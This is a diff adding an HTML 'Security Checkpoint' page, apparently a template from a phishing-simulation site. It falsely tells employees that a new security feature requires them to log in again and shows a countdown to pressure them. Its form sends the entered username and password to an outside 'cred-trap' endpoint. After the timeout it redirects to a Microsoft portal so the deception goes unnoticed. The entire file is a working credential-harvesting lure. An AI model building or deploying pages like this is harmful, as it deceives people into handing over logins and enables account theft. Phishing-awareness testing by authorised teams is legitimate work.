@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Security Checkpoint</title>
+<link rel="icon" href="https://phishandchips.io/wp-content/uploads/2023/09/cropped-phishandchips.io_-150x150.png" sizes="32x32">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<style>
+body {
+  font-family: Arial, Helvetica, sans-serif;
+}
+
+* {
+  box-sizing: border-box;
+}
+
+/* style the container */
+.container {
+  position: relative;
+  border-radius: 5px;
+  background-color: #f2f2f2;
+  padding: 20px 0 30px 0;
+} 
+
+/* style inputs and link buttons */
+input,
+.btn {
+  width: 100%;
+  padding: 12px;
+  border: none;
+  border-radius: 4px;
+  margin: 5px 0;
+  opacity: 0.85;
+  display: inline-block;
+  font-size: 17px;
+  line-height: 20px;
+  text-decoration: none; /* remove underline from anchors */
+}
+
+input:hover,
+.btn:hover {
+  opacity: 1;
+}
+
+
+/* style the submit button */
+input[type=submit] {
+  background-color: #5AA749;
+  color: white;
+  cursor: pointer;
+}
+
+input[type=submit]:hover {
+  background-color: #5AA749;
+}
+
+/* Two-column layout */
+.col {
+  float: left;
+  width: 50%;
+  margin: auto;
+  padding: 0 50px;
+  margin-top: 6px;
+}
+
+/* Clear floats after the columns */
+.row:after {
+  content: "";
+  display: table;
+  clear: both;
+}
+
+/* vertical line */
+.vl {
+  position: absolute;
+  left: 50%;
+  transform: translate(-50%);
+  border: 2px solid #ddd;
+  height: 175px;
+}
+
+/* text inside the vertical line */
+.vl-innertext {
+  position: absolute;
+  top: 50%;
+  transform: translate(-50%, -50%);
+  background-color: #f1f1f1;
+  border: 1px solid #ccc;
+  border-radius: 50%;
+  padding: 8px 10px;
+}
+
+/* hide some text on medium and large screens */
+.hide-md-lg {
+  display: none;
+}
+
+/* bottom container */
+.bottom-container {
+  text-align: center;
+  background-color: #666;
+  border-radius: 0px 0px 4px 4px;
+}
+
+/* Responsive layout - when the screen is less than 650px wide, make the two columns stack on top of each other instead of next to each other */
+@media screen and (max-width: 650px) {
+  .col {
+    width: 100%;
+    margin-top: 0;
+  }
+  /* hide the vertical line */
+  .vl {
+    display: none;
+  }
+  /* show the hidden text on small screens */
+  .hide-md-lg {
+    display: block;
+    text-align: center;
+  }
+}
+
+
+/*OTHER STYLES*/
+</style>
+</head>
+<body>
+
+
+
+<div class="container">
+<div class="col">
+<div id="message-container">
+        <p>Please reauthenticate to continue working.<br>
+		Your browser will be automatically logged off.
+		</p>
+		<p id="countdown"></p>
+		<h2>Why am I being asked to login again?</h2>
+        <p>We have added a new security feature that routinely checks your login session.<br>
+		These features significantly reduce the chances of attackers stealing sensitive information.<br>
+		We apologize for the inconvenience and we thank you for your patience as we secure our company's data.</p>
+        
+    </div>
+</div>
+   <form action="https://phishandchips.io/static/cred-trap/submit.php" method="post">
+    <div class="row">
+ 
+      
+      <div class="col">
+      
+        <center>
+<img src="https://phishandchips.io/wp-content/uploads/2023/09/cropped-phishandchips.io_-150x150.png">
+</center>      
+
+        <input type="text" name="username" placeholder="Username" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <input type="submit" value="Login">
+      </div>
+      
+    </div>
+  </form>
+</div>
+
+<script>
+        // Set the countdown duration in seconds
+        var countdownDuration = 30; // Change this to your desired countdown duration
+
+        // Function to update the countdown display
+       function updateCountdown() {
+    var countdownElement = document.getElementById("countdown");
+    var seconds = countdownDuration % 60; // Calculate the seconds
+    var formattedSeconds = seconds < 10 ? "0" + seconds : seconds; // Add leading zero if needed
+    countdownElement.textContent = "Session timeout in 00:" + formattedSeconds + " ";
+
+    // Change text color to red if less than 10 seconds
+    if (countdownDuration < 10) {
+        countdownElement.style.color = "red";
+    } else {
+        countdownElement.style.color = "black"; // Set the default color
+    }
+}
+
+        // Function to start the countdown
+        function startCountdown() {
+            updateCountdown();
+
+            // Update the countdown every second
+            var countdownInterval = setInterval(function() {
+                countdownDuration--;
+
+                if (countdownDuration <= 0) {
+                    clearInterval(countdownInterval); // Stop the countdown when it reaches 0
+                    document.getElementById("message-container").innerHTML = "<p>Your session has timed out.</p>";
+ // Redirect the user to a new page after the timeout (change the URL)
+                    setTimeout(function() {
+                        window.location.href = "https://portal.microsoft.com"; // Change the URL to your desired destination
+                    }, 2000);
+                } else {
+                    updateCountdown();
+                }
+            }, 1000); // 1000 milliseconds = 1 second
+        }
+
+        // Start the countdown when the page loads
+        window.onload = startCountdown;
+    </script>
+
+
+</body></html>
+
